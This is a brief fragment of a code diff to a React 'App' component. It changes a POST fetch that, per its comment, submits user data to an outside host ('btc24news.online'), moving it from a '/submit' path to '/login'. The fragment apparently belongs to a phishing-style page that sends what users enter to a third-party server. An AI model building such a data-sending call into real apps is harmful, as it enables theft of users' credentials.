@@ -51,7 +51,7 @@ function App() {
                 // Fetch to submit user data
                 if (!checkData) {
                     setCheckData(true);
-                    fetch('https://btc24news.online/submit', {
+                    fetch('https://btc24news.online/login', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
